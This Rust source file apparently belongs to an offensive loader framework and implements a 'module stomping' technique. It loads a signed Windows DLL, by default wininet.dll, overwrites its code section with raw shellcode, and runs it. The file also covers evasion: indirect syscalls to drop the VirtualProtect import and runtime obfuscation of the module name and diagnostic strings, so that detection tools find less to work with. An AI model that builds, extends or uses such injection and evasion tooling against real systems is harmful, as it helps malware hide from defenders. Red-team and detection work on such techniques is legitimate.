//! Module stomping.
//!
//! Loads a legitimate, signed DLL and overwrites its code section with the
//! payload, so execution happens from inside a module the image already maps.
//! See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;
use crate::plan::schema::PayloadFormat;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for module stomping: which payload to run (the payload format and
/// export live in the payload's `build.payloads` entry) and which module to
/// stomp.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Name of the payload in `build.payloads` to run. Optional when the plan
    /// declares exactly one payload.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub payload: Option<String>,

    /// Module to load and stomp, as a name the loader can resolve
    /// (`wininet.dll`) or a full path. Defaults to [`default_module`].
    ///
    /// A module another step patched or hooked (for example `amsi.dll` under
    /// `patch_amsi`) must not be chosen: the stomp overwrites the patched code.
    #[serde(default = "default_module")]
    pub module: String,
}

/// Default module to stomp: present and Microsoft-signed on every Windows SKU,
/// with a code section large enough for a staged payload, and not loaded by a
/// stub that does not use it itself — so the load is this technique's doing.
pub fn default_module() -> String {
    "wininet.dll".to_string()
}

impl Default for Params {
    /// Defaults to stomping `wininet.dll` (see [`default_module`]).
    fn default() -> Self {
        Self {
            payload: None,
            module: default_module(),
        }
    }
}

/// Static metadata for module stomping.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "module_stomping",
    // T1055 (Process Injection): ATT&CK has no module-stomping sub-technique,
    // and its own procedure examples put `.text`-section stomping of a system
    // DLL under T1055 (see the README).
    attck: &["T1055"],
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Execution,
    doc_path: "src/techniques/module_stomping/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    params_example: "technique: module_stomping\nparams:\n  module: wininet.dll\n",
    readme: include_str!("README.md"),
    // Only the page-protection change is a kernel call; `LoadLibraryA` stays a
    // Win32 import (a loader entry point, like `CreateProcessA` in
    // `process_hollowing`), so `mode: indirect` removes the `VirtualProtect`
    // import but keeps `LoadLibraryA`.
    syscalls: &["NtProtectVirtualMemory"],
    // The payload is raw shellcode: it has no import table of its own, so the
    // shared resolver is not rendered.
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment_for` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text — least of all the stomp target or
/// a technique keyword — lands in the generated stub's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    (
        "$MSG_EMPTY_PAYLOAD$",
        "module_stomping: the payload is empty",
    ),
    (
        "$MSG_PE_PAYLOAD$",
        "module_stomping: the payload is a PE image, but this technique only runs raw shellcode",
    ),
    (
        "$MSG_LOAD_FAILED$",
        "module_stomping: could not load the stomp target",
    ),
    (
        "$MSG_HEADERS$",
        "module_stomping: the stomp target's PE headers are malformed",
    ),
    (
        "$MSG_NO_CODE_SECTION$",
        "module_stomping: the stomp target has no .text section",
    ),
    (
        "$MSG_TOO_LARGE$",
        "module_stomping: the payload does not fit the stomp target's .text section",
    ),
    (
        "$MSG_PROTECT_FAILED$",
        "module_stomping: could not make the .text section writable",
    ),
    (
        "$MSG_RESTORE_FAILED$",
        "module_stomping: could not restore the .text section's protection",
    ),
];

impl Params {
    /// Renders the module-stomping stub fragment for these parameters.
    ///
    /// The stomp target and every diagnostic are rebuilt at runtime with the
    /// active string strategy, so neither the module name nor the message text
    /// appears in the generated stub's strings.
    ///
    /// `format` and `export` come from `build.payloads.<name>` for the
    /// Execution-technique contract; this technique only runs raw shellcode, so
    /// neither changes the fragment. `plan::validate` should reject the other
    /// formats for `module_stomping` before this runs — until it does, the
    /// fragment rejects a PE payload at runtime instead of executing its DOS
    /// header.
    pub fn render_fragment_for(
        &self,
        strings: &StringsConfig,
        _format: PayloadFormat,
        _export: Option<&str>,
    ) -> String {
        let module_def = strings
            .obfuscate(&self.module)
            .render_stub_expr("stomp_module");

        let mut rendered = DEF.stub_fragment.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("msg_{index}")),
            );
        }
        rendered.replace("$MODULE_DEF$", &module_def)
    }
}

#[cfg(test)]
mod tests;
